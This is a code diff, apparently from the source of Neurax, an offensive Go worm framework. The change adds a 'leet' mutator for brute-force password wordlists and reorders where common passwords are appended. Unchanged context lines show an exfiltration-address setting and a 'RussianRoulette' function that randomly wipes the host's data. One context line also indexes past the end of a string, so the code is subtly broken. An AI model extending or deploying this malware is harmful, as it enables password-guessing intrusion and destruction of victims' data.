@@ -128,7 +128,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ExfilAddr:        "none",
 	WordlistExpand:   false,
 	WordlistCommon:   false,
-	WordlistMutators: []string{"cyryllic", "single_upper", "encapsule"},
+	WordlistMutators: []string{"single_upper", "encapsule"},
 }
 
 //Verbose error printing
@@ -614,6 +614,19 @@ func WordSingleUpperTransform(word string) []string {
 	return res
 }
 
+func WordLeet(word string) []string {
+	leets := map[string]string{
+		"a": "4", "b": "3", "g": "9", "o": "0",
+		"t": "7", "s": "5", "h": "#", "i": "1",
+		"u": "v",
+	}
+	for k, v := range leets {
+		word = strings.Replace(word, k, v, -1)
+		word = strings.Replace(word, strings.ToUpper(k), v, -1)
+	}
+	return []string{word}
+}
+
 func RussianRoulette() error {
 	if coldfire.RandomInt(1, 6) == 6 {
 		return coldfire.Wipe()
@@ -624,6 +637,9 @@ func RussianRoulette() error {
 //Returns transformed words from input slice
 func NeuraxWordlist(words []string) []string {
 	wordlist := []string{}
+	if NeuraxConfig.WordlistCommon {
+		wordlist = append(wordlist, CommonPasswords...)
+	}
 	for _, word := range words {
 		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
 		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)]))
@@ -647,9 +663,9 @@ func NeuraxWordlist(words []string) []string {
 			if coldfire.Contains(NeuraxConfig.WordlistMutators, "single_upper") {
 				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
 			}
-		}
-		if NeuraxConfig.WordlistCommon {
-			wordlist = append(wordlist, CommonPasswords...)
+			if coldfire.Contains(NeuraxConfig.WordlistMutators, "leet") {
+				wordlist = append(wordlist, WordLeet(word)...)
+			}
 		}
 	}
 	return wordlist
